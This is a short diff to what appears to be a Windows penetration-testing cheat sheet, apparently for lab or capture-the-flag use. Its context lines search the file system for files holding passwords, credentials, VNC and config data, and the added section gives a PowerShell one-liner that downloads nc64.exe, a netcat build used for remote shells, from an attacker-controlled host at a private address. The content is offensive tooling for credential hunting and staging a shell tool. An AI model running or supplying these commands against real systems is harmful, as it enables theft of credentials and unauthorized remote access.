@@ -24,3 +24,8 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 findstr /spin "password" *.*
 findstr /spin "password" *.*
 ```
+
+## File download
+```
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.139:8080/nc64.exe', 'nc64.exe')
+```
